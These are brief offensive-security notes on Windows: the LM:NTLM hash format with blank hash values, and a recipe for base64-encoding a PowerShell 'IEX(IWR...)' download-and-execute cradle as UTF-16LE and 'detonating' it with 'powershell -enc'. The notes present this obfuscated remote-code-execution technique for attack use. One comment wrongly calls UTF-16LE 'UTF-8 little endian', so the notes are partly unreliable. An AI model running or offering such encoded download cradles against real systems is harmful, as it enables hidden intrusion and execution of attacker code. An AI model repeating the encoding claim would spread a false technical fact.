# facts on windows

sort these as the field manual develops

## Hashing on windows
> NTLM hashes
```
LM:NTLM						; lan man : new technology lan manager
aad3...:31d6...				; blank hashes
```
> explanation of above
```
LM is no longer used but is often required for interacting with services; Anything can be put here! So long as its a valid hash
```


## default windows encoding
> default encoding
```
UTF-16le 			; UTF-8 little endian

NECESSARY FOR POWERSHELL ENCODED COMMANDS
```


> encoding the payload
```sh
echo -n 'IEX(IWR....)' | iconv -t UTF-16LE | base64 -w 0

explanation:
	echo is the ps command we doing, new object, invoke-web, w.e.
	-t ; to code
	-w 0 ; all on 1 line
```


> detonating the payload
```sh
powershell -enc 'BASE64_ENCODED_COMMAND'
```

